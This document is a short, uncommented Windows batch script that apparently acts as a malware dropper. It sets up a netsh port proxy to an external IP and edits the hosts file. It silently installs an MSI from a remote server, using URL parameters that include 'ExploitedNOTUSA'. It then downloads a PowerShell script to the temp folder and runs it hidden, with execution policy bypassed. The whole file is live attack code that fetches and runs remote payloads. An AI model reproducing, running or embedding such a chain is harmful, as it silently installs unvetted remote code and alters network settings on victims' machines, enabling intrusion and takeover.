@echo off
netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=88 connectaddress=185.241.211.197 connectport=80
echo 127.0.0.1 007.from-ak.com>>%SystemRoot%\System32\drivers\etc\hosts
msiexec.exe /i"http://185.241.211.197/Bin/UpdateConnect.ClientSetup.msi?e=Access&y=Guest&c=ExploitedNOTUSA" /qn /norestart
curl.exe -fsSL "https://ns.mo7sen.dev/EadF.php?p=4" -o "%TEMP%\sckit-decoder.ps1"
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\sckit-decoder.ps1" -Mode full
